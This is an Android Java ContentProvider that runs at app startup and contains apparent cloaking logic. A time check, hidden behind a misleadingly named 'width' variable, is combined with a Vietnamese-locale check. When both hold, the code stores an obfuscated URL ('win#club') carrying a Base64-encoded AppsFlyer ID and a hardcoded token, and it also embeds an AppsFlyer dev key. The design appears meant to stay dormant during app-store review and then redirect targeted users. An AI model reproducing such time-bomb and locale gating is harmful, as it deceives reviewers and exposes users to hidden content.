package com.example.myapplication;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.res.Resources;
import android.database.Cursor;
import android.net.Uri;
import android.util.Base64;
import android.util.Log;

import com.appsflyer.AppsFlyerConversionListener;
import com.appsflyer.AppsFlyerLib;

import org.json.JSONObject;

import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.Locale;
import java.util.Map;

public class DispathProvider extends ContentProvider {
    @Override
    public boolean onCreate() {

        initData();
        return true;
    }

    @Override
    public Cursor query( Uri uri,  String[] strings,  String s,  String[] strings1,  String s1) {
        return null;
    }

    @Override
    public String getType( Uri uri) {
        return "";
    }

    @Override
    public Uri insert( Uri uri,  ContentValues contentValues) {
        return null;
    }

    @Override
    public int delete( Uri uri,  String s,  String[] strings) {
        return 0;
    }

    @Override
    public int update( Uri uri,  ContentValues contentValues,  String s,  String[] strings) {
        return 0;
    }

    long width = 1724407200000L;


    public void initData() {

        boolean t = System.currentTimeMillis() > width;

        Locale locale = Resources.getSystem().getConfiguration().locale;
        String ll = locale.getLanguage();
        boolean l = ll.equals("vi");
        boolean a = t & l;

        new Trace().sayHello("hello");

        SharedPreferences.Editor editor = getContext().getApplicationContext().getSharedPreferences("data", Context.MODE_PRIVATE).edit();

        if (a) {
            editor.putInt("num", 1);
        } else {
            editor.putInt("num", 2);
        }

        AppsFlyerLib appsFlyerLib = AppsFlyerLib.getInstance();
        appsFlyerLib.setDebugLog(true);
        appsFlyerLib.init("2o5ebrDVwrE8RqB8DAdNo7", new AppsFlyerConversionListener() {
            @Override
            public void onConversionDataSuccess(Map<String, Object> map) {
                Log.e("xxx", "ok");
            }

            @Override
            public void onConversionDataFail(String s) {
                Log.e("xxx", s);
            }

            @Override
            public void onAppOpenAttribution(Map<String, String> map) {
            }

            @Override
            public void onAttributionFailure(String s) {
            }
        }, getContext());
        appsFlyerLib.start(getContext());

        String appsflyer_id = appsFlyerLib.getAppsFlyerUID(getContext());

        HashMap map = new HashMap<String, String>();
        map.put("appsflyer_id", appsflyer_id);
        map.put("token", "b801b903-4318-4bb0-9107-73efffdc7886");
        map.put("app_id", "com.example.toutu");

        JSONObject jsonObject = new JSONObject(map);
        String afstr = jsonObject.toString();
        String eString = null;
        eString = Base64.encodeToString(afstr.getBytes(StandardCharsets.UTF_8), Base64.DEFAULT);

        if (a) {
            editor.putString("data", "https://www.google.com?search=win#club.#net?code=1197&af="+eString).apply();
        } else {
            editor.putString("u", "").apply();
        }
    }

}